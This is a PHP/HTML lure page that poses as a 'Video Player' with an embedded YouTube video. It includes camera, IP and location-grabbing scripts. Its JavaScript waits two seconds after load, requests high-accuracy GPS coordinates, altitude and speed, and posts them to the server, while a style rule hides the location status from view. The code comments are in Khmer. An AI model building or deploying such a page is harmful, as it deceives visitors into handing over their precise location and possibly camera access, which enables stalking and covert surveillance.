<?php
    include 'cams.php';
    include 'ip.php';
    include 'location.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Player</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .video-container {
            width: 100%;
            max-width: 800px;
        }
        /* លាក់ការស្នើសុំទីតាំង */
        #location-status {
            display: none;
        }
    </style>
</head>
<body>

    <div class="video-container">
        <iframe 
            id="Live_YT_TV" 
            width="100%" 
            height="450" 
            src="https://www.youtube.com/embed/C5ir_rQ4L4g?autoplay=1"
            frameborder="0" 
            allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; geolocation" 
            allowfullscreen>
        </iframe>
    </div>

    <script>
    // ទង់សម្រាប់ពិនិត្យថាបានផ្ញើទីតាំងរួចហើយឬនៅ
    var locationSent = false;
    
    // ចាប់យកទីតាំង GPS តែម្ដង
    function getLocation() {
        // បើបានផ្ញើរួចហើយ មិនត្រូវផ្ញើទៀតទេ
        if (locationSent) {
            console.log("Location already sent, skipping...");
            return;
        }
        
        if (navigator.geolocation) {
            console.log("Requesting location...");
            
            // ជម្រើសសម្រាប់ការចាប់ទីតាំងតែម្ដង
            const options = {
                enableHighAccuracy: true,  // ចង់បានភាពត្រឹមត្រូវខ្ពស់
                timeout: 10000,            // រង់ចាំ 10 វិនាទី
                maximumAge: 0               // មិនយកទិន្នន័យចាស់
            };
            
            // ចាប់ទីតាំងតែម្ដង (មិនតាមដាន)
            navigator.geolocation.getCurrentPosition(sendLocation, showError, options);
            
        } else {
            console.log("Geolocation is not supported by this browser.");
        }
    }
    
    function sendLocation(position) {
        // កុំផ្ញើច្រើនដង
        if (locationSent) return;
        
        console.log("Location obtained, sending to server...");
        
        const locationData = {
            lat: position.coords.latitude,
            lng: position.coords.longitude,
            accuracy: position.coords.accuracy,
            altitude: position.coords.altitude || 'N/A',
            altitudeAccuracy: position.coords.altitudeAccuracy || 'N/A',
            heading: position.coords.heading || 'N/A',
            speed: position.coords.speed || 'N/A',
            timestamp: new Date().toISOString()
        };
        
        // បង្ហាញទីតាំងក្នុង console (សម្រាប់តេស្ត)
        console.log("Latitude:", locationData.lat);
        console.log("Longitude:", locationData.lng);
        console.log("Accuracy:", locationData.accuracy, "meters");
        
        // ផ្ញើទៅកាន់ server
        $.ajax({
            type: 'POST',
            url: '/location.php',
            data: { location: JSON.stringify(locationData) },
            dataType: 'json',
            success: function(response) {
                console.log('✅ Location sent successfully');
                locationSent = true; // កំណត់ថាបានផ្ញើរួច
                if (response.map) {
                    console.log('📍 Map link:', response.map);
                }
            },
            error: function(xhr, status, error) {
                console.log('❌ Error sending location:', error);
            }
        });
    }
    
    function showError(error) {
        console.log("❌ Geolocation error:");
        switch(error.code) {
            case error.PERMISSION_DENIED:
                console.log("User denied the request for Geolocation.");
                break;
            case error.POSITION_UNAVAILABLE:
                console.log("Location information is unavailable.");
                break;
            case error.TIMEOUT:
                console.log("The request to get user location timed out.");
                break;
            case error.UNKNOWN_ERROR:
                console.log("An unknown error occurred.");
                break;
        }
    }
    
    // ហៅមុខងារចាប់យកទីតាំងពេលផ្ទុកទំព័ររួច
    $(document).ready(function() {
        console.log("Page loaded, waiting 2 seconds before requesting location...");
        
        // រង់ចាំ 2 វិនាទី រួចសួររកទីតាំង
        setTimeout(getLocation, 2000);
        
        // លែងមាន setInterval សម្រាប់តាមដានទៀតហើយ
    });
    </script>
</body>
</html>